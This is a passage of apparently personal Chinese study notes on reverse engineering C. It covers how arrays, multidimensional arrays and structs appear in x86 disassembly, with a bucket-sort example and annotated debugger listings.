class=\"line\"><span class=\"number\">0040</span>D802  |.  <span class=\"number\">8B</span>548D CC           mov     edx,dword ptr ss:[ebp+ecx*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]             ; edx = [local<span class=\"number\">.9</span>] = <span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D806  |.  <span class=\"number\">8955</span> F4             mov     [local<span class=\"number\">.3</span>],edx\t\t\t\t\t\t\t\t\t; r= <span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D809  |.  <span class=\"number\">5F</span>                  pop     edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D80A  |.  <span class=\"number\">5</span>E                  pop     esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D80B  |.  <span class=\"number\">5B</span>                  pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D80C  |.  <span class=\"number\">8B</span>E5                mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D80E  |.  <span class=\"number\">5</span>D                  pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D80F  \\.  C3                  retn</span><br><span class=\"line\"></span><br><span class=\"line\">[ebp+ecx*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]  每次减去<span class=\"number\">0x34</span>的原因，<span class=\"number\">0x34</span> = <span class=\"number\">52</span>，是该函数内所有局部变量一共分配的空间</span><br><span class=\"line\">ecx的值即为数组下标,去对应数组的下标即可取到对应的值,注意下标从<span class=\"number\">0</span>开始</span><br><span class=\"line\"><span class=\"type\">short</span> ecx * <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">10</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;     <span class=\"comment\">//后面会用0补</span></span><br><span class=\"line\"></span><br><span class=\"line\">二维数组在汇编中和一维数组存储方式一样</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">3</span>][<span class=\"number\">4</span>] = &#123;[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>],[],[]&#125;     <span class=\"comment\">//编译报错</span></span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">3</span>][<span class=\"number\">4</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>&#125;;  <span class=\"comment\">//正常执行</span></span><br><span class=\"line\">多维数组只是用户使用方便，编译后的结果都一样</span><br><span class=\"line\"><span class=\"type\">int</span> a[][<span class=\"number\">4</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>&#125;;   <span class=\"comment\">//编译通过，编译器四个一组分配</span></span><br><span class=\"line\"><span class=\"type\">int</span> a[<span class=\"number\">3</span>][] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>&#125;;   <span class=\"comment\">//编译错误</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">5</span>][<span class=\"number\">12</span>] = &#123;&#125;</span><br><span class=\"line\">arr[<span class=\"number\">1</span>][<span class=\"number\">7</span>] = arr[<span class=\"number\">1</span>*<span class=\"number\">12</span>+<span class=\"number\">7</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> arr[<span class=\"number\">5</span>][<span class=\"number\">4</span>][<span class=\"number\">3</span>] = arr[<span class=\"number\">1</span>*<span class=\"number\">4</span>*<span class=\"number\">3</span> + <span class=\"number\">2</span>*<span class=\"number\">3</span> + <span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">桶排序</span><br><span class=\"line\"><span class=\"number\">1.</span>找数组中最大的，创建max+<span class=\"number\">1</span>个数的数组</span><br><span class=\"line\"><span class=\"number\">2.</span>下标对应改为出现的次数</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">dui</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a[<span class=\"number\">10</span>] = &#123;<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">7</span>,<span class=\"number\">7</span>,<span class=\"number\">6</span>,<span class=\"number\">6</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> max = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> p = <span class=\"number\">1</span>; p &lt; <span class=\"number\">10</span>; p++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (a[p]&gt;max)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmax = a[p];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,max);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> b[max] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt;= max<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tb[a[i]]++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt;= max<span class=\"number\">-1</span>; i++)</span><br><span class=\"line\">\t&#123; </span><br><span class=\"line\">\t\t<span class=\"type\">int</span> k = b[i];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (k &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> m = k; m&gt;<span class=\"number\">0</span>; m--)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,i);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tdui();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230113171701402.png\" alt=\"image-20230113171701402\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230114173623044.png\" alt=\"image-20230114173623044\"></p>\n<h3 id=\"结构体\"><a class=\"markdownIt-Anchor\" href=\"#结构体\">#</a> 结构体</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">float</span> x;</span><br><span class=\"line\">    <span class=\"type\">float</span> y;</span><br><span class=\"line\">    <span class=\"type\">float</span> z;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> m_up;</span><br><span class=\"line\">\t<span class=\"type\">char</span> m_Name[<span class=\"number\">32</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> m_Num;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    B zuobiao;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">A aa;</span><br><span class=\"line\"><span class=\"comment\">// aa + 4 //m_up</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">A 通过一级偏移找到B zuobiao</span><br><span class=\"line\">zuobiao通过二级偏移找到xyz</span><br><span class=\"line\">    </span><br><span class=\"line\">结构体在创建时不分配空间</span><br><span class=\"line\">A aa;   此时分配空间</span><br><span class=\"line\">aa.fXpos = <span class=\"number\">2.1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">结构体在定义的时候，除了自身以外，可以存储任何类型</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct AA</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint m;</span><br><span class=\"line\">\tint n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">struct  st</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tshort b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">\tint arr[10];</span><br><span class=\"line\">\tAA aa;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">st x;</span><br><span class=\"line\"></span><br><span class=\"line\">void func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tx.a = 10;</span><br><span class=\"line\">\tx.b = 20;</span><br><span class=\"line\">\tx.c = 30;</span><br><span class=\"line\">\tx.arr[0] = 100;</span><br><span class=\"line\">\tx.aa.m = 22;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void func2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a1  = x.a;</span><br><span class=\"line\">\tint y1 = x.arr[0];</span><br><span class=\"line\">\tint y2 = x.aa.m;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">st func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tst s;</span><br><span class=\"line\">\ts.a = 1;</span><br><span class=\"line\">\ts.b = 2;</span><br><span class=\"line\">\ts.c = 3;</span><br><span class=\"line\">\treturn s;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>数组和结构体判断</p>\n<p>等宽连续 - 数组</p>\n<p>连续不等宽 - 大概率结构体</p>\n<p>但结构体中都是相同类型的变量也可以逆成数组</p>\n<p>结构体尽量定义为全局变量，减少复制次数，尽量不要当参数和返回值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 结构体作为全局变量</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">st</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">short</span> b;</span><br><span class=\"line\">\t<span class=\"type\">char</span> c;</span><br><span class=\"line\">\t<span class=\"type\">int</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">st x;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tx.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\tx.b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\tx.c = <span class=\"number\">30</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func2</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a1 = x.a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b1 = x.b;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c1 = x.c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfunc();</span><br><span class=\"line\">\tfunc2();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401030</span> &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">00401031</span>  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401033</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">40</span>       sub     esp,<span class=\"number\">0x40</span></span><br><span class=\"line\"><span class=\"number\">00401036</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00401037</span>  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">00401038</span>  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">00401039</span>  |.  <span class=\"number\">8</span>D7D C0       lea     edi,[local<span class=\"number\">.16</span>]</span><br><span class=\"line\"><span class=\"number\">0040103</span>C  |.  B9 <span class=\"number\">10000000</span>   mov     ecx,<span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"number\">00401041</span>  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401046</span>  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401048</span>  |.  C705 <span class=\"number\">507</span>C4200&gt;mov     dword ptr ds:[<span class=\"number\">0x427C50</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">00401052</span>  |.  <span class=\"number\">66</span>:C705 <span class=\"number\">547</span>C4&gt;mov     word ptr ds:[<span class=\"number\">0x427C54</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">0040105B</span>  |.  C605 <span class=\"number\">567</span>C4200&gt;mov     byte ptr ds:[<span class=\"number\">0x427C56</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">00401062</span>  |.  C705 <span class=\"number\">587</span>C4200&gt;mov     dword ptr ds:[<span class=\"number\">0x427C58</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040106</span>C  |.  C705 <span class=\"number\">5</span>C7C4200&gt;mov     dword ptr ds:[<span class=\"number\">0x427C5C</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">00401076</span>  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">00401077</span>  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">00401078</span>  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">00401079</span>  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040107B</span>  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040107</span>C  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401090</span> &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">00401091</span>  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401093</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C       sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">00401096</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00401097</span>  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">00401098</span>  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">00401099</span>  |.  <span class=\"number\">8</span>D7D B4       lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">0040109</span>C  |.  B9 <span class=\"number\">13000000</span>   mov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">004010</span>A1  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">004010</span>A6  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">004010</span>A8  |.  A1 <span class=\"number\">507</span>C4200   mov     eax,dword ptr ds:[<span class=\"number\">0x427C50</span>]</span><br><span class=\"line\"><span class=\"number\">004010</span>AD  |.  <span class=\"number\">8945</span> FC       mov     [local<span class=\"number\">.1</span>],eax</span><br><span class=\"line\"><span class=\"number\">004010B</span>0  |.  <span class=\"number\">0F</span>BF0D <span class=\"number\">547</span>C42&gt;movsx   ecx,word ptr ds:[<span class=\"number\">0x427C54</span>]</span><br><span class=\"line\"><span class=\"number\">004010B</span>7  |.  <span class=\"number\">894</span>D F8       mov     [local<span class=\"number\">.2</span>],ecx</span><br><span class=\"line\"><span class=\"number\">004010B</span>A  |.  <span class=\"number\">0F</span>BE15 <span class=\"number\">567</span>C42&gt;movsx   edx,byte ptr ds:[<span class=\"number\">0x427C56</span>]</span><br><span class=\"line\"><span class=\"number\">004010</span>C1  |.  <span class=\"number\">8955</span> F4       mov     [local<span class=\"number\">.3</span>],edx</span><br><span class=\"line\"><span class=\"number\">004010</span>C4  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">004010</span>C5  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">004010</span>C6  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">004010</span>C7  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">004010</span>C9  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">004010</span>CA  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span 